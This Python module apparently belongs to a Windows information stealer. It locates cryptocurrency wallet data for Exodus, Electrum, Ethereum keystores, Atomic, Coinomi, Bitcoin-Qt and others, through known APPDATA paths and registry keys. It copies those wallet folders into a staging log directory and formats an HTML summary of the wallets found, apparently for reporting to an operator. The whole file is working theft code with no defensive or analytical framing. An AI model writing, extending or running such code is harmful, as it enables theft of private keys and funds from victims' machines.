
from os import getenv, mkdir, environ
from os.path import exists
from winreg import QueryValue,HKEY_CURRENT_USER,OpenKey
from manager.logger import Log
from shutil import copytree
from preferences.config import config

def Wallets():
    msgInfo = ""
    Log("===========Wallets===========")
    msgInfo+="\n\n\n<b>💰Wallets💰</b>"
    roaming = getenv('APPDATA')
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\Wallets'

    directory = {
        'Exodus': roaming + '\\Exodus\\exodus.wallet\\',
        'Electrum': roaming + '\\Electrum\\wallets\\',
        'Etherium': roaming + '\\Ethereum\\keystore\\',
        'Armory': roaming + '\\Armory\\',
        'Bytecoin': roaming + '\\bytecoin\\',
        'Feather Wallet': roaming + '\\FeatherWallet\\',
        'Guarda': roaming + '\\Guarda\\Local Storage\\leveldb',
        'Atomic': roaming + '\\atomic\\Local Storage\\leveldb',
        'Coinimi': roaming + '\\Coinomi\\Coinomi\\wallets\\'
    }

    registry_directory = {
        "Litecoin",
        "Dash",
        "Bitcoin"
    }
    
    wallets = []

    for key, value in directory.items():
        if exists(value):
            wallets.append(value)
            msgInfo+=f"\n∟💸{key}"

    for wallet in registry_directory:
        try:
            registryKey = OpenKey(HKEY_CURRENT_USER, "Software\\" + wallet + "\\" + wallet + "-Qt")

            cdir = QueryValue(registryKey, "strDataDir") + "\\wallets"
            if exists(cdir):
                wallets.append(cdir)
        except Exception as e:
            Log(f"Wallets {wallet} ---> {e}")
    
    if wallets:
        mkdir(pathToLogs)
        for wallet in wallets:
            copytree(wallet, pathToLogs+"\\"+wallet.split("\\")[-2], False, None, dirs_exist_ok=True)

    return msgInfo

